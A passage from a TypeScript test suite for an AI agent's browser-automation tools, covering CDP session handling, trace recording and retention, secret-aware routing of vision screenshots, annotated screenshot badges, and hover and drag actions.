    browserTest.resetChromiumImportForTest();
    await expect(browserTest.connectProviderForTest("cdp", undefined)).rejects.toThrow(/missing cdpUrl/);
  });

  test("isHandleAlive probes the remote Browser.isConnected() for a cdp handle", () => {
    // A live cdp attach reports alive; an externally-disconnected one reports
    // dead so ensureShared re-attaches instead of reusing a dead handle.
    browserTest.installFakeCdpHandleForTest({ isConnected: () => true }, { pages: () => [], close: async () => undefined });
    expect(browserTest.isSharedHandleAliveForTest()).toBe(true);
    browserTest.installFakeCdpHandleForTest({ isConnected: () => false }, { pages: () => [], close: async () => undefined });
    expect(browserTest.isSharedHandleAliveForTest()).toBe(false);
  });

  test("getScreencastPort returns null for a cdp handle (no port we own)", () => {
    // The sign-in screencast only applies to the SPAWNED Chrome's debug port;
    // a cdp-attached handle is the user's own Chrome, so there's no port to
    // screencast — getScreencastPort must report null.
    browserTest.installFakeCdpHandleForTest({ isConnected: () => true }, { pages: () => [], close: async () => undefined });
    expect(getScreencastPort()).toBeNull();
  });
});

// Session-provider seam: acquisition (ensureShared) and release
// (teardownHandle) must both dispatch through the provider registry, so a
// future remote provider can swap the transport without touching the
// in-process snapshot/redaction/SSRF layers above the seam.
describe("browser session provider seam", () => {
  afterEach(() => {
    browserTest.setSessionProviderForTest("spawned", null);
    browserTest.uninstallFakeBrowserForTest();
    browserTest.clearFakeSessionsForTest();
    browserTest.clearPendingSharedForTest();
  });

  test("the default path connects and teardown disconnects through the registered provider", async () => {
    const fakePage = {
      on: () => undefined,
      close: () => Promise.resolve(),
      goto: () => Promise.resolve(null),
      url: () => "about:blank",
      title: () => Promise.resolve(""),
      evaluate: () => Promise.resolve([])
    };
    const fakeContext = {
      pages: () => [],
      newPage: async () => fakePage,
      close: async () => undefined,
      browser: () => ({ isConnected: () => true })
    };
    let connectCalls = 0;
    const disconnectedKinds: string[] = [];
    browserTest.setSessionProviderForTest("spawned", {
      kind: "spawned",
      connect: async () => {
        connectCalls++;
        return {
          kind: "spawned",
          context: fakeContext as never,
          port: 9333,
          profileDir: "/tmp/fake-profile"
        };
      },
      disconnect: async (handle) => {
        disconnectedKinds.push(handle.kind);
      }
    });

    try {
      // Snapshot wiring may throw on the fake page; only the provider
      // dispatch is under test.
      await browserNavigate("seam-task", { url: "https://example.com/" });
    } catch {
      // ignore
    }
    expect(connectCalls).toBe(1);

    // disconnectSharedBrowser is the instance-wide reset; it must tear down
    // the spawned handle through its provider.
    await disconnectSharedBrowser();
    expect(disconnectedKinds).toEqual(["spawned"]);
  });
});

// Opt-in session trace recording (RuntimeConfig.browserRecording): tracing
// starts on session create only when enabled, stops + saves into the
// instance-scoped browser-traces dir on session close (with an audit row),
// and retention keeps only the newest TRACE_RETENTION_MAX archives.
describe("browser session trace recording", () => {
  const TEST_ROOT = "/tmp/gini-browser-trace-recording";

  const makeTracingContext = () => {
    const startCalls: Array<Record<string, unknown>> = [];
    const stopCalls: Array<string | undefined> = [];
    const fakePage = {
      on: () => undefined,
      close: () => Promise.resolve(),
      goto: () => Promise.resolve(null),
      url: () => "about:blank",
      title: () => Promise.resolve(""),
      evaluate: () => Promise.resolve([])
    };
    const context = {
      pages: () => [],
      newPage: async () => fakePage,
      close: async () => undefined,
      tracing: {
        start: async (options: Record<string, unknown>) => {
          startCalls.push(options);
        },
        stop: async (options?: { path?: string }) => {
          stopCalls.push(options?.path);
          if (options?.path) writeFileSync(options.path, "fake-trace-zip");
        }
      }
    };
    return { context, startCalls, stopCalls };
  };

  // Make the spawned provider hand back a supplied tracing context, so the
  // default tool path records traces against it without launching Chrome.
  const installSpawnedTracingProvider = (context: unknown) => {
    browserTest.setSessionProviderForTest("spawned", {
      kind: "spawned",
      connect: async () => ({
        kind: "spawned",
        context: context as never,
        port: 9333,
        profileDir: "/tmp/fake-profile"
      }),
      disconnect: async () => undefined
    });
  };

  afterEach(() => {
    mock.restore();
    browserTest.setSessionProviderForTest("spawned", null);
    browserTest.resetSessionTraceForTest();
    browserTest.uninstallFakeBrowserForTest();
    browserTest.clearFakeSessionsForTest();
    browserTest.clearPendingSharedForTest();
    setBrowserInstance("dev");
    rmSync(TEST_ROOT, { recursive: true, force: true });
  });

  test("enabled: tracing starts on session create and stop saves + audits on session close", async () => {
    process.env["GINI_STATE_ROOT"] = TEST_ROOT;
    const instance = `trace-on-${process.pid}`;
    rmSync(`${TEST_ROOT}/instances/${instance}`, { recursive: true, force: true });
    setBrowserInstance(instance);
    setBrowserRecording(true);

    const { context, startCalls, stopCalls } = makeTracingContext();
    installSpawnedTracingProvider(context);

    try {
      await browserNavigate("trace-task", { url: "https://example.com/" });
    } catch {
      // Snapshot wiring may throw on the fake page; tracing is what's pinned.
    }
    expect(startCalls).toEqual([{ screenshots: true, snapshots: true }]);
    expect(browserTest.activeTraceTaskIdForTest()).toBe("trace-task");

    await browserTest.closeSessionForTest("trace-task");
    expect(stopCalls.length).toBe(1);
    const savedPath = stopCalls[0]!;
    expect(savedPath).toContain(`/instances/${instance}/browser-traces/`);
    expect(savedPath).toContain("trace-task");
    expect(savedPath.endsWith(".zip")).toBe(true);
    expect(existsSync(savedPath)).toBe(true);
    expect(browserTest.activeTraceTaskIdForTest()).toBe(null);
    // The save wrote a browser.trace_saved audit row pointing at the archive.
    const audit = readState(instance).audit.find((row) => row.action === "browser.trace_saved");
    expect(audit?.target).toBe(savedPath);
    expect(audit?.taskId).toBe("trace-task");
    expect(audit?.evidence?.["sizeBytes"]).toBe("fake-trace-zip".length);
  });

  test("disabled (default): no tracing calls on create or close", async () => {
    process.env["GINI_STATE_ROOT"] = TEST_ROOT;
    const instance = `trace-off-${process.pid}`;
    rmSync(`${TEST_ROOT}/instances/${instance}`, { recursive: true, force: true });
    setBrowserInstance(instance);
    // Deliberately no setBrowserRecording(true) — off is the default.

    const { context, startCalls, stopCalls } = makeTracingContext();
    installSpawnedTracingProvider(context);

    try {
      await browserNavigate("trace-off-task", { url: "https://example.com/" });
    } catch {
      // ignore — see above.
    }
    await browserTest.closeSessionForTest("trace-off-task");

    expect(startCalls.length).toBe(0);
    expect(stopCalls.length).toBe(0);
    expect(readState(instance).audit.some((row) => row.action === "browser.trace_saved")).toBe(false);
  });

  test("retention prunes to the newest 10 trace archives", () => {
    const dir = join(TEST_ROOT, "prune");
    mkdirSync(dir, { recursive: true });
    // 13 archives with strictly increasing mtimes, plus a non-zip bystander.
    const base = Date.now() / 1000 - 1000;
    for (let i = 0; i < 13; i++) {
      const path = join(dir, `trace-${String(i).padStart(2, "0")}.zip`);
      writeFileSync(path, "x");
      utimesSync(path, base + i, base + i);
    }
    writeFileSync(join(dir, "notes.txt"), "not a trace");

    browserTest.pruneTraceFilesForTest(dir);

    const remaining = readdirSync(dir).sort();
    expect(remaining.filter((name) => name.endsWith(".zip")).length).toBe(10);
    // The three OLDEST archives were deleted; the newest survive.
    expect(remaining).not.toContain("trace-00.zip");
    expect(remaining).not.toContain("trace-01.zip");
    expect(remaining).not.toContain("trace-02.zip");
    expect(remaining).toContain("trace-03.zip");
    expect(remaining).toContain("trace-12.zip");
    // Non-zip files are never touched.
    expect(remaining).toContain("notes.txt");
  });
});

// browser_vision native-image fast-path gate: the screenshot may enter the
// conversation directly ONLY when the active model accepts image input AND
// no secrets are registered for ANY active task (raw pixels cannot be
// post-OCR-redacted, so the union registry must be empty). No provider
// tool-result serializer can carry an image part yet, so browserVision
// still routes every call through the aux side-call — this suite pins the
// gate decision itself.
describe("browser_vision native-image route gate", () => {
  const configFor = (provider: RuntimeConfig["provider"]): RuntimeConfig => ({
    instance: "test",
    port: 7337,
    token: "test",
    provider,
    workspaceRoot: "/tmp",
    stateRoot: "/tmp/gini-vision-route-test",
    logRoot: "/tmp/gini-vision-route-test-logs"
  });

  afterEach(() => {
    browserTest.resetFilledSecretsForTest();
  });

  test("vision-capable model + empty cross-task secret registry → native-image", () => {
    const route = browserTest.resolveVisionRouteForTest(configFor({ name: "anthropic", model: "claude-sonnet-4-5" }));
    expect(route).toBe("native-image");
  });

  test("a secret registered by ANY task forces the aux side-call even on a vision-capable model", () => {
    // The registering task is unrelated to the vision caller — the gate
    // reads the cross-task union (shared BrowserContext can surface one
    // task's credential on another task's page).
    browserTest.recordFilledSecretForTest("unrelated-task", "hunter2-long-secret");
    const route = browserTest.resolveVisionRouteForTest(configFor({ name: "anthropic", model: "claude-sonnet-4-5" }));
    expect(route).toBe("aux-side-call");
  });

  test("a model without vision capability stays on the aux side-call", () => {
    const route = browserTest.resolveVisionRouteForTest(configFor({ name: "echo", model: "gini-echo-v0" }));
    expect(route).toBe("aux-side-call");
  });
});

// browser_vision: screenshots the current page and asks the configured vision
// model a question. We install a fake session with a stub `page.screenshot`
// so we don't need a real Chromium, and route the provider through the echo
// stub so the model response is deterministic.
describe("browserVision", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
    clearEchoVisionResponses();
  });

  test("screenshots the current page and threads the question through generateVisionAnalysis", async () => {
    let screenshotCalls = 0;
    const fakePage = {
      screenshot: async (_opts: { type: "png"; fullPage?: boolean }) => {
        screenshotCalls++;
        // Tiny PNG header bytes — any non-empty Buffer is sufficient since
        // the provider call is stubbed.
        return Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
      },
      url: () => "https://example.com/dashboard"
    };
    browserTest.installFakeSessionWithPageForTest("vision-task", fakePage);

    setEchoVisionResponse({ text: "There is a login form in the center of the page." });

    const config: RuntimeConfig = {
      instance: "test",
      port: 7337,
      token: "test",
      provider: { name: "echo", model: "gini-echo-v0" },
      workspaceRoot: "/tmp",
      stateRoot: "/tmp/gini-vision-test",
      logRoot: "/tmp/gini-vision-test-logs"
    };
    const raw = await browserVision("vision-task", { question: "What is on this page?" }, config);
    const parsed = JSON.parse(raw) as {
      success: boolean;
      answer?: string;
      bytes?: number;
      url?: string;
      full?: boolean;
      imageMarkdown?: string;
    };
    expect(parsed.success).toBe(true);
    expect(parsed.answer).toContain("login form");
    expect(parsed.bytes).toBeGreaterThan(0);
    expect(parsed.url).toBe("https://example.com/dashboard");
    expect(parsed.full).toBe(false);
    expect(screenshotCalls).toBe(1);
    // The captured PNG is stored as an upload and surfaced as a ready-to-paste
    // markdown tag the model drops inline into its reply. The bytes are the
    // same ones sent to the vision model (already secret-blurred).
    expect(parsed.imageMarkdown).toBeDefined();
    expect(parsed.imageMarkdown).toMatch(/^!\[screenshot\]\(gini-upload:\/\/[A-Za-z0-9._-]+\)$/);
  });

  test("still succeeds (text answer, no image) when storing the screenshot upload throws", async () => {
    // An empty buffer slips past the byte-cap check (0 is not over the cap)
    // and makes storeUpload throw "Upload is empty." The tool must still
    // succeed on the text answer — image storage is best-effort — and the
    // envelope must simply omit the `image` field. Exercises the catch path.
    const fakePage = {
      screenshot: async () => Buffer.alloc(0),
      url: () => "https://example.com/empty"
    };
    browserTest.installFakeSessionWithPageForTest("vision-emptybuf", fakePage);
    setEchoVisionResponse({ text: "Blank page." });
    const config: RuntimeConfig = {
      instance: "test",
      port: 7337,
      token: "test",
      provider: { name: "echo", model: "gini-echo-v0" },
      workspaceRoot: "/tmp",
      stateRoot: "/tmp/gini-vision-test",
      logRoot: "/tmp/gini-vision-test-logs"
    };
    const raw = await browserVision("vision-emptybuf", { question: "what?" }, config);
    const parsed = JSON.parse(raw) as { success: boolean; answer?: string; imageMarkdown?: unknown };
    expect(parsed.success).toBe(true);
    expect(parsed.answer).toContain("Blank page.");
    expect(parsed.imageMarkdown).toBeUndefined();
  });

  test("fails fast when the screenshot exceeds the base64-aware byte cap", async () => {
    // Hand the fake page an oversize Buffer past the raw-byte budget (whose
    // base64 expansion stays under the provider's encoded cap). 4MB + 1 trips
    // the 3,750,000-byte budget while avoiding wasted test memory.
    const maxBytes = resolveImageByteLimit({ name: "echo", model: "gini-echo-v0" });
    const oversize = Buffer.alloc(4 * 1024 * 1024 + 1, 0xff);
    expect(oversize.length).toBeGreaterThan(maxBytes);
    const fakePage = {
      screenshot: async () => oversize,
      url: () => "https://example.com/big"
    };
    browserTest.installFakeSessionWithPageForTest("vision-oversize", fakePage);
    setEchoVisionResponse({ text: "should-not-be-reached" });

    const config: RuntimeConfig = {
      instance: "test",
      port: 7337,
      token: "test",
      provider: { name: "echo", model: "gini-echo-v0" },
      workspaceRoot: "/tmp",
      stateRoot: "/tmp/gini-vision-test",
      logRoot: "/tmp/gini-vision-test-logs"
    };
    const raw = await browserVision("vision-oversize", { question: "describe" }, config);
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/Screenshot too large/);
    expect(parsed.error).toMatch(new RegExp(`${maxBytes} byte cap`));
  });

  test("bails with 'Browser disconnecting' if the generation advances between baseline and provider return", async () => {
    // browserVision captures the disconnect generation BEFORE the
    // screenshot await, then re-checks AFTER the provider response. To
    // exercise that re-check we bump the generation from inside the fake
    // screenshot itself, AFTER browserVision has captured its baseline —
    // i.e. while browserVision is suspended on the screenshot await. By
    // the time the provider call finishes and the re-check fires, the
    // generation has moved past the baseline and browserVision returns
    // the standard "Browser disconnecting" sentinel.
    const fakePage = {
      screenshot: async () => {
        // Bump while suspended inside the screenshot await — this is the
        // window the re-check is designed to catch.
        browserTest.bumpDisconnectGenerationForTest();
        return Buffer.from([0x89, 0x50, 0x4e, 0x47]);
      },
      url: () => "https://example.com/disconnect"
    };
    browserTest.installFakeSessionWithPageForTest("vision-disconnect", fakePage);
    setEchoVisionResponse({ text: "fake-answer" });
    const config: RuntimeConfig = {
      instance: "test",
      port: 7337,
      token: "test",
      provider: { name: "echo", model: "gini-echo-v0" },
      workspaceRoot: "/tmp",
      stateRoot: "/tmp/gini-vision-test",
      logRoot: "/tmp/gini-vision-test-logs"
    };
    const raw = await browserVision("vision-disconnect", { question: "what" }, config);
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/disconnecting/i);
  });

  test("envelope carries provider cost so the dispatcher can accumulate it into task.cost", async () => {
    const fakePage = {
      screenshot: async () => Buffer.from([0x89, 0x50, 0x4e, 0x47]),
      url: () => "https://example.com/dashboard"
    };
    browserTest.installFakeSessionWithPageForTest("vision-cost", fakePage);
    // Provide a stubbed response with a fake cost record so the
    // browserVision envelope picks it up.
    setEchoVisionResponse({
      text: "answer with cost",
      cost: {
        provider: "echo",
        model: "gini-echo-v0",
        inputTokens: 100,
        outputTokens: 20,
        totalTokens: 120,
        estimatedUsd: 0.00012
      }
    });
    const config: RuntimeConfig = {
      instance: "test",
      port: 7337,
      token: "test",
      provider: { name: "echo", model: "gini-echo-v0" },
      workspaceRoot: "/tmp",
      stateRoot: "/tmp/gini-vision-test",
      logRoot: "/tmp/gini-vision-test-logs"
    };
    const raw = await browserVision("vision-cost", { question: "what?" }, config);
    const parsed = JSON.parse(raw) as { success: boolean; cost?: { totalTokens?: number } };
    expect(parsed.success).toBe(true);
    expect(parsed.cost?.totalTokens).toBe(120);
  });

  test("rejects calls missing the required question argument", async () => {
    const fakePage = {
      screenshot: async () => Buffer.from([0x89]),
      url: () => "https://example.com/"
    };
    browserTest.installFakeSessionWithPageForTest("vision-missing-q", fakePage);
    const config: RuntimeConfig = {
      instance: "test",
      port: 7337,
      token: "test",
      provider: { name: "echo", model: "gini-echo-v0" },
      workspaceRoot: "/tmp",
      stateRoot: "/tmp/gini-vision-test",
      logRoot: "/tmp/gini-vision-test-logs"
    };
    const raw = await browserVision("vision-missing-q", {}, config);
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/question/i);
  });
});

// browser_vision annotate: numbered ref badges overlaid before the
// screenshot. The fake page's evaluate(fn, arg) runs the callback locally
// against a fake DOM installed on globalThis (same pattern as the
// snapshot-walker tests), so the real injection/removal logic is exercised
// without Chromium.
describe("browserVision annotated screenshots", () => {
  type VisionFakeEl = {
    _attrs: Record<string, string>;
    rect: { left: number; top: number; right: number; bottom: number; width: number; height: number };
    dataset: Record<string, string | undefined>;
    style: { filter?: string };
    getAttribute(name: string): string | null;
    getBoundingClientRect(): VisionFakeEl["rect"];
  };
  type FakeBadge = {
    _attrs: Record<string, string>;
    textContent: string;
    style: { cssText: string };
    setAttribute(name: string, value: string): void;
    remove(): void;
  };

  const makeStamped = (
    ref: string,
    init?: { secret?: boolean; rect?: Partial<VisionFakeEl["rect"]> }
  ): VisionFakeEl => ({
    _attrs: { "data-gini-ref": ref, ...(init?.secret ? { "data-gini-secret": "true" } : {}) },
    rect: { left: 10, top: 10, right: 110, bottom: 30, width: 100, height: 20, ...init?.rect },
    dataset: {},
    style: { filter: "" },
    getAttribute(name: string) {
      return Object.prototype.hasOwnProperty.call(this._attrs, name) ? this._attrs[name]! : null;
    },
    getBoundingClientRect() {
      return this.rect;
    }
  });

  // Installs fake document/window globals. Returns the LIVE badge list
  // (appendChild pushes, badge.remove() splices — so length reflects what
  // is currently in the overlay) and a restore callback for the globals.
  const installFakeDom = (els: VisionFakeEl[], scroll?: { x: number; y: number }) => {
    const badges: FakeBadge[] = [];
    const originalDocument = (globalThis as Record<string, unknown>).document;
    const originalWindow = (globalThis as Record<string, unknown>).window;
    (globalThis as unknown as { document: unknown }).document = {
      documentElement: { appendChild: (b: FakeBadge) => badges.push(b) },
      querySelectorAll: (selector: string) => {
        if (selector === "[data-gini-vision-badge]") return [...badges];
        const attr = selector.slice(1, -1);
        return els.filter((el) => Object.prototype.hasOwnProperty.call(el._attrs, attr));
      },
      createElement: (_tag: string) => {
        const badge: FakeBadge = {
          _attrs: {},
          textContent: "",
          style: { cssText: "" },
          setAttribute(name: string, value: string) {
            this._attrs[name] = value;
          },
          remove() {
            const i = badges.indexOf(badge);
            if (i >= 0) badges.splice(i, 1);
          }
        };
        return badge;
      }
    };
    (globalThis as unknown as { window: unknown }).window = {
      innerWidth: 1280,
      innerHeight: 800,
      scrollX: scroll?.x ?? 0,
      scrollY: scroll?.y ?? 0
    };
    const restore = () => {
      if (originalDocument === undefined) delete (globalThis as Record<string, unknown>).document;
      else (globalThis as Record<string, unknown>).document = originalDocument;
      if (originalWindow === undefined) delete (globalThis as Record<string, unknown>).window;
      else (globalThis as Record<string, unknown>).window = originalWindow;
    };
    return { badges, restore };
  };

  const evalLocally = (<A, R>(fn: (arg: A) => R | Promise<R>, arg?: A): Promise<R> =>
    Promise.resolve(fn(arg as A))) as unknown as import("playwright-core").Page["evaluate"];

  // Badges are filtered to refs the session holds, so each test registers
  // the ids it expects badged (values are irrelevant — only keys are read).
  const setSessionRefIds = (taskId: string, ids: string[]) => {
    const refs = new Map<string, unknown>();
    for (const id of ids) refs.set(`@${id}`, {});
    browserTest.setFakeSessionRefsForTest(taskId, refs);
  };

  const config: RuntimeConfig = {
    instance: "test",
    port: 7337,
    token: "test",
    provider: { name: "echo", model: "gini-echo-v0" },
    workspaceRoot: "/tmp",
    stateRoot: "/tmp/gini-vision-test",
    logRoot: "/tmp/gini-vision-test-logs"
  };

  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
    clearEchoVisionResponses();
  });

  test("annotate:true badges viewport-visible stamped elements, skips secret-stamped ones, and strips the overlay after", async () => {
    const visible = makeStamped("e1");
    const secret = makeStamped("e2", { secret: true });
    // Below the 800px-tall fake viewport — must not be badged.
    const offscreen = makeStamped("e3", { rect: { top: 5000, bottom: 5020 } });
    const { badges, restore } = installFakeDom([visible, secret, offscreen]);
    let badgeTextsAtScreenshot: string[] = [];
    const fakePage = {
      evaluate: evalLocally,
      screenshot: async () => {
        badgeTextsAtScreenshot = badges.map((b) => b.textContent);
        return Buffer.from([0x89, 0x50, 0x4e, 0x47]);
      },
      url: () => "https://example.com/annotated"
    };
    browserTest.installFakeSessionWithPageForTest("vision-annotate", fakePage);
    setSessionRefIds("vision-annotate", ["e1", "e2", "e3"]);
    setEchoVisionResponse({ text: "annotated answer" });
    try {
      const raw = await browserVision("vision-annotate", { question: "what?", annotate: true }, config);
      expect(JSON.parse(raw).success).toBe(true);
      // Only the viewport-visible, non-secret element was badged.
      expect(badgeTextsAtScreenshot).toEqual(["e1"]);
      // The overlay never survives the call.
      expect(badges.length).toBe(0);
    } finally {
      restore();
    }
  });

  test("badge injection caps at 50 badges", async () => {
    const els = Array.from({ length: 60 }, (_, i) => makeStamped(`e${i + 1}`));
    const { badges, restore } = installFakeDom(els);
    let badgeCountAtScreenshot = -1;
    const fakePage = {
      evaluate: evalLocally,
      screenshot: async () => {
        badgeCountAtScreenshot = badges.length;
        return Buffer.from([0x89, 0x50, 0x4e, 0x47]);
      },
      url: () => "https://example.com/dense"
    };
    browserTest.installFakeSessionWithPageForTest("vision-cap", fakePage);
    setSessionRefIds("vision-cap", els.map((el) => el._attrs["data-gini-ref"]!));
    setEchoVisionResponse({ text: "dense answer" });
    try {
      const raw = await browserVision("vision-cap", { question: "what?", annotate: true }, config);
      expect(JSON.parse(raw).success).toBe(true);
      // VISION_ANNOTATE_BADGE_CAP keeps a ref-dense page legible.
      expect(badgeCountAtScreenshot).toBe(50);
      expect(badges.length).toBe(0);
    } finally {
      restore();
    }
  });

  test("badges are document-absolute: viewport rect plus scroll offset", async () => {
    const { badges, restore } = installFakeDom([makeStamped("e1")], { x: 5, y: 1000 });
    let cssAtScreenshot = "";
    const fakePage = {
      evaluate: evalLocally,
      screenshot: async () => {
        cssAtScreenshot = badges[0]?.style.cssText ?? "";
        return Buffer.from([0x89, 0x50, 0x4e, 0x47]);
      },
      url: () => "https://example.com/scrolled"
    };
    browserTest.installFakeSessionWithPageForTest("vision-scrolled", fakePage);
    setSessionRefIds("vision-scrolled", ["e1"]);
    setEchoVisionResponse({ text: "scrolled answer" });
    try {
      const raw = await browserVision("vision-scrolled", { question: "what?", annotate: true }, config);
      expect(JSON.parse(raw).success).toBe(true);
      // position:fixed would pin the badge to the viewport and miss its
      // element in a fullPage capture; document coordinates compose.
      expect(cssAtScreenshot).toContain("position:absolute");
      expect(cssAtScreenshot).toContain("left:15px");
      expect(cssAtScreenshot).toContain("top:1010px");
    } finally {
      restore();
    }
  });

  test("full:true badges below-fold elements the viewport filter would drop", async () => {
    const belowFold = makeStamped("e1", { rect: { top: 5000, bottom: 5020 } });
    const { badges, restore } = installFakeDom([belowFold]);
    let badgeTextsAtScreenshot: string[] = [];
    const fakePage = {
      evaluate: evalLocally,
      screenshot: async () => {
        badgeTextsAtScreenshot = badges.map((b) => b.textContent);
        return Buffer.from([0x89, 0x50, 0x4e, 0x47]);
      },
      url: () => "https://example.com/long"
    };
    browserTest.installFakeSessionWithPageForTest("vision-fullpage", fakePage);
    setSessionRefIds("vision-fullpage", ["e1"]);
    setEchoVisionResponse({ text: "fullpage answer" });
    try {
      const raw = await browserVision("vision-fullpage", { question: "what?", annotate: true, full: true }, config);
      expect(JSON.parse(raw).success).toBe(true);
      expect(badgeTextsAtScreenshot).toEqual(["e1"]);
    } finally {
      restore();
    }
  });

  test("stamped elements whose ref the session does not hold get no badge", async () => {
    // e2 carries a stamp (char-budget drop, or page-planted attribute)
    // but the session never mapped it — badging it would cite a ref the
    // agent cannot act on.
    const { badges, restore } = installFakeDom([makeStamped("e1"), makeStamped("e2")]);
    let badgeTextsAtScreenshot: string[] = [];
    const fakePage = {
      evaluate: evalLocally,
      screenshot: async () => {
        badgeTextsAtScreenshot = badges.map((b) => b.textContent);
        return Buffer.from([0x89, 0x50, 0x4e, 0x47]);
      },
      url: () => "https://example.com/unmapped"
    };
    browserTest.installFakeSessionWithPageForTest("vision-unmapped", fakePage);
    setSessionRefIds("vision-unmapped", ["e1"]);
    setEchoVisionResponse({ text: "unmapped answer" });
    try {
      const raw = await browserVision("vision-unmapped", { question: "what?", annotate: true }, config);
      expect(JSON.parse(raw).success).toBe(true);
      expect(badgeTextsAtScreenshot).toEqual(["e1"]);
    } finally {
      restore();
    }
  });

  test("the overlay is stripped even when the screenshot throws", async () => {
    const { badges, restore } = installFakeDom([makeStamped("e1")]);
    const fakePage = {
      evaluate: evalLocally,
      screenshot: async () => {
        // Badges are up at this point; the throw must not strand them.
        expect(badges.length).toBe(1);
        throw new Error("capture exploded");
      },
      url: () => "https://example.com/boom"
    };
    browserTest.installFakeSessionWithPageForTest("vision-strip-on-fail", fakePage);
    setSessionRefIds("vision-strip-on-fail", ["e1"]);
    try {
      const raw = await browserVision("vision-strip-on-fail", { question: "what?", annotate: true }, config);
      const parsed = JSON.parse(raw) as { success: boolean; error?: string };
      expect(parsed.success).toBe(false);
      expect(parsed.error).toContain("capture exploded");
      expect(badges.length).toBe(0);
    } finally {
      restore();
    }
  });

  test("the ref-badge mapping sentence reaches the vision prompt only when annotate is set", async () => {
    // No DOM here: a page without evaluate skips the overlay entirely, and
    // the unseeded echo provider answers "Vision stub: <prompt>" so the
    // exact prompt is observable in the answer.
    const fakePage = {
      screenshot: async () => Buffer.from([0x89, 0x50, 0x4e, 0x47]),
      url: () => "https://example.com/prompt"
    };
    browserTest.installFakeSessionWithPageForTest("vision-prompt-on", fakePage);
    const annotatedRaw = await browserVision("vision-prompt-on", { question: "describe the page", annotate: true }, config);
    const annotated = JSON.parse(annotatedRaw) as { success: boolean; answer?: string };
    expect(annotated.success).toBe(true);
    expect(annotated.answer).toContain("describe the page");
    expect(annotated.answer).toContain("numbered badges");
    expect(annotated.answer).toContain("@e12");

    browserTest.installFakeSessionWithPageForTest("vision-prompt-off", fakePage);
    const plainRaw = await browserVision("vision-prompt-off", { question: "describe the page" }, config);
    const plain = JSON.parse(plainRaw) as { success: boolean; answer?: string };
    expect(plain.success).toBe(true);
    expect(plain.answer).toContain("describe the page");
    expect(plain.answer).not.toContain("badge");
  });
});

// Shared helper: build a minimal fake Page that satisfies the surface our
// tool entry points exercise (evaluate for snapshot, title/url, optional
// waitForLoadState). Tests planted refs directly via setFakeSessionRefsForTest
// so the walker doesn't need to run — they pass `fullMode: false` and we
// return an empty raw array which yields an empty snapshot.
function makeFakePageForRefTools(url = "https://example.com/"): Partial<import("playwright-core").Page> {
  return {
    url: () => url,
    title: () => Promise.resolve("Example"),
    // Walker invokes page.evaluate twice (clear stale refs, then walk). We
    // resolve to undefined for the cleanup pass and an empty walker result
    // for the walk so the snapshot text is just empty. The walker now
    // returns { entries, hiddenEmitted, hiddenTotal, hiddenBudget }; the
    // text-rendering loop reads `.entries` so we mirror that shape.
    evaluate: (async () => ({ entries: [], hiddenEmitted: 0, hiddenTotal: 0, hiddenBudget: 0 })) as unknown as import("playwright-core").Page["evaluate"],
    waitForLoadState: (async () => undefined) as unknown as import("playwright-core").Page["waitForLoadState"]
  };
}

describe("browserHover", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  test("resolves the ref and calls locator.hover with a 10s timeout", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("hover-task", fakePage);
    const hoverCalls: Array<{ timeout?: number }> = [];
    const fakeLocator = {
      hover: async (opts?: { timeout?: number }) => {
        hoverCalls.push(opts ?? {});
      }
    };
    const refs = new Map<string, unknown>();
    refs.set("@e3", fakeLocator);
    browserTest.setFakeSessionRefsForTest("hover-task", refs);

    const raw = await browserHover("hover-task", { ref: "@e3" });
    const parsed = JSON.parse(raw) as { success: boolean; url?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.url).toBe("https://example.com/");
    expect(hoverCalls.length).toBe(1);
    expect(hoverCalls[0]!.timeout).toBe(10_000);
  });

  test("returns the standard 'Unknown ref' error for missing refs", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("hover-missing", fakePage);
    const raw = await browserHover("hover-missing", { ref: "@e99" });
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("Unknown ref @e99");
    expect(parsed.error).toContain("fresh snapshot");
  });

  test("rejects missing ref argument", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("hover-noarg", fakePage);
    const raw = await browserHover("hover-noarg", {});
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/ref/i);
  });
});

describe("browserDrag", () => {
  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
  });

  test("calls dragTo(toLoc, { timeout: 10000 }) on the from-locator", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("drag-task", fakePage);
    const fromLoc = {
      dragTo: async (target: unknown, opts?: { timeout?: number }) => {
        (fromLoc as unknown as { _called: { target: unknown; opts?: { timeout?: number } } })._called = {
          target,
          opts: opts ?? {}
        };
      }
    };
    const toLoc = { _marker: "to" };
    const refs = new Map<string, unknown>();
    refs.set("@e1", fromLoc);
    refs.set("@e2", toLoc);
    browserTest.setFakeSessionRefsForTest("drag-task", refs);

    const raw = await browserDrag("drag-task", { fromRef: "@e1", toRef: "@e2" });
    const parsed = JSON.parse(raw) as { success: boolean };
    expect(parsed.success).toBe(true);
    const captured = (fromLoc as unknown as { _called?: { target: unknown; opts?: { timeout?: number } } })._called;
    expect(captured).toBeDefined();
    expect(captured!.target).toBe(toLoc);
    expect(captured!.opts!.timeout).toBe(10_000);
  });

  test("returns 'Unknown ref' when fromRef is missing", async () => {
    const fakePage = makeFakePageForRefTools();
    browserTest.installFakeSessionWithPageForTest("drag-bad-from", fakePage);
    const refs = new Map<string, unknown>();
    refs.set("@e2", { dragTo: async () => undefined });
